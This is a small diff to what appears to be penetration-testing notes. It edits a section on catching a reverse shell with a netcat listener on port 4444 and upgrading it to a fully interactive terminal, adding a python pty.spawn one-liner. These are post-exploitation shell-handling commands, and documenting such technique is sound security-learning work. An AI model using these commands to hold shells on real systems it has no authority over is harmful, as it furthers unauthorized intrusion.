@@ -46,7 +46,8 @@ nc -lvnp 4444
 # Interactive shell
 /bin/bash -i
 
-# Enable to get a better functional shell
+# Upgrade to fully functional terminal
 $ SHELL=/bin/bash script -q /dev/null
-www-data@vulnerable:~$
+# or
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
